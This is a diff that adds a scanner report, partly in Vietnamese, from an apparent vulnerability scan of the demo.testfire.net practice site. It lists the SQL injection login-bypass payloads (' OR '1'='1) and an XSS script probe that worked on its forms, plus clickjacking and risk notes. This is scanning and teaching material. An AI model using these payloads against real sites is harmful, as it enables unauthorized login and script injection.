@@ -1,0 +1,51 @@
+____________________________________________________
+                       Report                       
+____________________________________________________
+The url is: https://demo.testfire.net/login.jsp
+
+scanning for SQL Injection...
+            .....
+                   searching....
+                                 Connecting!!!!!
+
+[!] Trying https://demo.testfire.net/login.jsp"
+[!] Trying https://demo.testfire.net/login.jsp'
+[+] Phát hiện 2 forms trên https://demo.testfire.net/login.jsp.
+[+] Phát hiện lỗ hổng SQL Injection, link: https://demo.testfire.net/login.jsp
+[+] Form:
+{'action': 'doLogin',
+ 'inputs': [{'name': 'uid', 'type': 'text', 'value': ''},
+            {'name': 'passw', 'type': 'password', 'value': ''},
+            {'name': 'btnSubmit', 'type': 'submit', 'value': 'Login'}],
+ 'method': 'post'}
+[+] Value: ' OR '1'='1
+[+] Phát hiện lỗ hổng SQL Injection, link: https://demo.testfire.net/login.jsp
+[+] Form:
+{'action': 'doLogin',
+ 'inputs': [{'name': 'uid', 'type': 'text', 'value': ''},
+            {'name': 'passw', 'type': 'password', 'value': ''},
+            {'name': 'btnSubmit', 'type': 'submit', 'value': 'Login'}],
+ 'method': 'post'}
+[+] Value: ' OR '' = '
+Scanning for XSS...
+[+] phát hiện lỗ hổng XSS trong  https://demo.testfire.net/login.jsp
+Chúng tôi cho rằng nó nằm ở form bên dưới khi chúng tôi inject đoạn script vào
+{'action': '/search.jsp',
+ 'inputs': [{'name': 'query',
+             'type': 'text',
+             'value': "<script>alert('hi')</script>"},
+            {'name': None, 'type': 'submit', 'value': 'Go'}],
+ 'method': 'get'}
+
+
+____________________________________________________
+                       RISKS                            
+________________________________________________________
+1. Dẫn đến những hành động không mong muốn của người dùng
+2. Có thể bị tấn công deface
+3. Có thể bị inject trojan vào web
+____________________________________________________
+
+Scanned at = 14/05/2024 08:42:56
+Scanning for Clickjacking...
+[31mCó thể bị tấn công clicjacking : https://demo.testfire.net/login.jsp[0m
